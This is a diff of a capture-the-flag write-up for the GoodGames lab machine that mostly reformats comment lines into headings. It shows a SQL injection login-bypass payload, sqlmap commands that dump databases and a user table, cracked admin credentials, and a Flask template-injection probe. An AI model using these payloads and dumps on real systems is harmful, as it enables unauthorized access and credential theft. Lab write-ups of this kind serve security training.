@@ -1,17 +1,17 @@
 # nmap
-//nmap all ports
+## nmap all ports
 ![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/nmap%20port%20scan.png)
 
 # gobuster
-//gobuster main
+## gobuster main
 ![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/gobuster-main.png)
 
 # domain
 
-//goodgame.htb/blog
+## goodgame.htb/blog
 ![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/goodgames.htb.blog.png)
 
-//STORE: site is in progress, nothing interesting
+## STORE: site is in progress, nothing interesting
 ![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/goodgames.htb.coming-soon.png)
 
 Login Panel: goodgames.htb
@@ -21,24 +21,24 @@ mail: @ is required and therefore not sqli testable --> intercept with burp
 Try simple sqli in login creds 
 sqli:  'or 1=1-- -
 
-//Intercept
+## Intercept
 ![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/burpsuite%20login%20intercept.png)
 
-//Payload
+## Payload
 ![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/burpsuite%20sqli%20success.png)
 
 //Succesfull payload:   ' or 1=1-- -
-//Succesfull login
+## Succesfull login
 ![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/domain%20login%20successful.png)
 
-//Dashboard
+## Dashboard
 ![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/goodgames%20dashboard.png)
 
-//new subdomain: internal-administration.goodgames.htb
+## new subdomain: internal-administration.goodgames.htb
 ![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/goodgames%20unknown%20host.png)
 
-//Again a login
-//Try creds found by sqlmap: admin:superadministrator
+## Again a login
+## Try creds found by sqlmap: admin:superadministrator
 ![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/internal-administration.goodgames.htb.login.png)
 
 # sqlmap
@@ -48,38 +48,38 @@ sqlmap -r request-login.txt --dbs
 
 `````
 
-//database snippet
+## database snippet
 ![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/sqlmap%20databases.png)
 
 dump database main and its tables entrys
 ````
 sqlmap -r request-login.txt -D main --tables
 
-//speed it up
+## speed it up
 
 sqlmap -r request-login.txt --dbs --threads 10 --time-sec 1
 `````
 
-//database main tables
+## database main tables
 ![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/sqlmap%20database%20main%20tables.png)
 dump user table
 ````
 sqlmap -r request-login.txt -D main -T user --dump
 
-//speed it up
+## speed it up
 
 sqlmap -r request-login.txt -D main -T user --dump --threads 10 --time-sec 1
 `````
-//receive creds from database
+## receive creds from database
 ![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/sqlmap%20creds.png)
 
-//crackstation
+## crackstation
 ![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/crackstation%20admin%20hash.png)
 
-//internal.administration dashboard
+## internal.administration dashboard
 ![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/internal%20admnistration%20dashboard.png)
 
-//Flask application dashborar in settings: SSTI {{7*7}} = 49
+## Flask application dashborar in settings: SSTI {{7*7}} = 49
 ![](Pasted image 20220913185124.png)
 
 ![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/ssti%20reflected.png)
